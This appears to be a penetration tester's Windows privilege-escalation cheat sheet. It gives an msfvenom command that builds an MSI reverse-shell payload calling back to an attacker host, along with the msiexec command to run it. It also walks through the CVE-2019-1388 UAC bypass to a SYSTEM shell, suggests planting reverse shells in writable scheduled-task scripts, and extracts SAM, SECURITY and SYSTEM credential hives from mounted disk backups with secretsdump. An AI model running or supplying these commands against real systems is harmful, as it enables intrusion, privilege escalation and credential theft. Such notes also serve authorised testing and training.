# Misc

### Always install elevated

```shellscript
# Check that it is enabled => looking for 0x1
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

# Generate an MSI package 
msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi

# Execute it and catch a shell => Important to pass the whole PATH to the file
msiexec /i <PATH_TO_MSI_FILE> /quiet /qn /norestart
```

### CVE-2019-1388

Abuses of the executable `hhupd.exe` ⇒ launch it as admin then we can bypass the UAC

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FsA4XBcmytC8YLlffaVkF%2Fimage.png?alt=media&#x26;token=be3e6a3d-52e2-4199-9062-479c3881c6f6" alt=""><figcaption></figcaption></figure>

Click `Show information about the publisher's certificate` ⇒ `General` ⇒ `Issued By` ⇒ Click the link then click OK ⇒ It will open a wep page ⇒ right click ⇒ view page source ⇒ right click on the source ⇒ save as ⇒ it will open a dialog box = enter `c:\windows\system32\cmd.exe` in the path and hit enter ⇒ we get a system shell

### Scheduled tasks

By default, we can only see tasks created by our user and default scheduled tasks that every Windows operating system has. Unfortunately, we cannot list out scheduled tasks created by other users (such as admins) because they are stored in `C:\Windows\System32\Tasks`, which standard users do not have read access to. It is not uncommon for system administrators to go against security practices and perform actions such as provide read or write access to a folder usually reserved only for administrators. We (though rarely) may encounter a scheduled task that runs as an administrator configured with weak file/folder permissions for any number of reasons. In this case, we may be able to edit the task itself to perform an unintended action or modify a script run by the scheduled task.

```shellscript
# Enumerating shceduled tasks => read above
schtasks /query /fo LIST /v
Get-ScheduledTask | select TaskName,State

# Check permissions on a dir where cron scripts would be stored
.\accesschk64.exe /accepteula -s -d C:\Scripts\

# If we do have permission to write on scripts, we should attempt to place a rev shell
```

### Mount VHDX / VMDK

Three specific file types of interest are `.vhd`, `.vhdx`, and `.vmdk` files. These are Virtual Hard Disk, Virtual Hard Disk v2 (both used by Hyper-V), and Virtual Machine Disk (used by VMware)

```shellscript
# Mount VMDK on Linux
guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk

# Mount VHD/VHDX on Linux
guestmount --add WEBSRV10.vhdx  --ro /mnt/vhdx/ -m /dev/sda1
```

In Windows, we can right-click on the file and choose `Mount`, or use the `Disk Management` utility to mount a `.vhd` or `.vhdx` file. If preferred, we can use the [Mount-VHD](https://docs.microsoft.com/en-us/powershell/module/hyper-v/mount-vhd?view=windowsserver2019-ps) PowerShell cmdlet. Regardless of the method, once we do this, the virtual hard disk will appear as a lettered drive that we can then browse.

For a `.vmdk` file, we can right-click and choose `Map Virtual Disk` from the menu. Next, we will be prompted to select a drive letter. If all goes to plan, we can browse the target operating system's files and directories. If this fails, we can use VMWare Workstation `File --> Map Virtual Disks` to map the disk onto our base system. We could also add the `.vmdk` file onto our attack VM as an additional virtual hard drive, then access it as a lettered drive. We can even use `7-Zip` to extract data from a .`vmdk` file. This [guide](https://www.nakivo.com/blog/extract-content-vmdk-files-step-step-guide/) illustrates many methods for gaining access to the files on a `.vmdk` file.

The interest of a backup / virtual hard drive is to retreive SAM, SECURITY and SYSTEM from `C:\\Windows\\System32\\Config`

```shellscript
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```
